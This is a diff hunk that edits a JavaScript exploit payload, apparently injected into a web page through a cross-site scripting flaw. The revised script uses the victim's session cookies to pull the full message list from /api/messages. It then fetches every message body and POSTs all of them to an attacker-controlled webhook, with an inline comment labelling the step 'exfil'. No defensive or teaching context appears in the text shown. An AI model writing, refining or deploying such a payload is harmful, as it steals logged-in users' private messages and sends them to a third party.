@@ -19,19 +19,19 @@
               async function run() {
                 const WEBHOOK = '${WEBHOOK}';
                 
-                const results = await Promise.all(
-                  ${JSON.stringify(endpoints)}.map(async ep => {
-                    const res = await fetch(ep, {credentials:'include'});
-                    const text = await res.text();
-                    return {ep, status: res.status, text};
-                  })
+                // Get full message list
+                const msgs = await fetch('/api/messages', {credentials:'include'}).then(r=>r.json());
+                
+                // Fetch ALL bodies in parallel — don't wait between them
+                const bodies = await Promise.all(
+                  msgs.map(m => fetch('/api/messages/'+m.id, {credentials:'include'}).then(r=>r.json()))
                 );
                 
+                // Single exfil with everything
                 await fetch(WEBHOOK, {
                   method: 'POST',
                   mode: 'no-cors',
-                  keepalive: true,
-                  body: JSON.stringify(results)
+                  body: JSON.stringify({total: msgs.length, bodies})
                 });
               }
               run();
